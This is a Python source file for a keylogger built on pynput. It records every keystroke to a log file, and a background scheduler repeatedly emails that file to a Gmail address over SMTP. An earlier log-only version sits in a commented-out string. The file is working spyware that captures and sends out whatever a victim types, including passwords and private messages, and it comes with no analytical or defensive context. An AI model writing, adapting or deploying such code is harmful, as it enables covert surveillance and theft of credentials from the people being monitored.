import pynput
from pynput.keyboard import Key, Listener

"""

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open('keylog.txt', 'a') as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            with open('keylog.txt', 'a') as f:
                f.write(" ")
        elif key == Key.backspace:
            with open('keylog.txt', 'a') as f:
                f.write("BACKSPACE")
        elif key == Key.enter:
            with open('keylog.txt', 'a') as f:
                f.write("\n")
        elif key == Key.shift:
            with open('keylog.txt', 'a') as f:
                f.write("SHIFT")
        elif key == Key.ctrl:
            with open('keylog.txt', 'a') as f:
                f.write("CTRL")
        elif key == Key.alt:
            with open('keylog.txt', 'a') as f:
                f.write("ALT")
        elif key == Key.tab:
            with open('keylog.txt', 'a') as f:
                f.write("TAB")
        elif key == Key.caps_lock:
            with open('keylog.txt', 'a') as f:
                f.write("CAPS_LOCK")
        elif key == Key.esc:
            with open('keylog.txt', 'a') as f:
                f.write("ESC")
        elif key == Key.delete:
            with open('keylog.txt', 'a') as f:
                f.write("DELETE")
        else:
            with open('keylog.txt', 'a') as f:
                f.write(f"{key}")


def on_release(key):
    if key == Key.esc:
        # Stop the listener on pressing the Escape key
        return False


# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"""

import pynput
from pynput.keyboard import Key, Listener
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
import threading

# Global variable to track time
start_time = time.time()


def send_email():
    try:
        # Email details
        from_email = "testeautokey@gmail.com"
        to_email = "tvrx.py@gmail.com"
        subject = "Keylog File"
        body = "Please find the keylog file attached."

        # Setup the MIME
        message = MIMEMultipart()
        message['From'] = from_email
        message['To'] = to_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Attach the keylog file
        with open('../keylog.txt', 'rb') as attachment:
            part = MIMEText(attachment.read(), 'base64', 'utf-8')
            part.add_header('Content-Disposition', 'attachment', filename="../keylog.txt")
            message.attach(part)

        # Send the email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(from_email, "your_password")
            server.sendmail(from_email, to_email, message.as_string())
        print("Email sent successfully.")

    except Exception as e:
        print(f"Error sending email: {e}")


def on_press(key):
    try:
        with open('../keylog.txt', 'a') as f:
            f.write(f"{key.char}")
    except AttributeError:
        special_keys = {
            Key.space: " ",
            Key.backspace: "BACKSPACE",
            Key.enter: "\n",
            Key.shift: "SHIFT",
            Key.ctrl: "CTRL",
            Key.alt: "ALT",
            Key.tab: "TAB",
            Key.caps_lock: "CAPS_LOCK",
            Key.esc: "ESC",
            Key.delete: "DELETE"
        }
        with open('../keylog.txt', 'a') as f:
            f.write(special_keys.get(key, str(key)))


def on_release(key):
    if key == Key.esc:
        return False


# Schedule email after 5 minutes (300 seconds)
def job():
    # Check if 5 minutes have passed
    if time.time() - start_time > 300:
        send_email()


# Function to run the scheduler in a separate thread
def scheduler_thread():
    while True:
        schedule.run_pending()
        time.sleep(1)


# Start the scheduler in a new thread
scheduler_thread = threading.Thread(target=scheduler_thread)
scheduler_thread.daemon = True
scheduler_thread.start()

# Schedule the task to send email after 5 minutes
schedule.every(1).minute.do(job)


# Start the keylogger
def run():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    run()
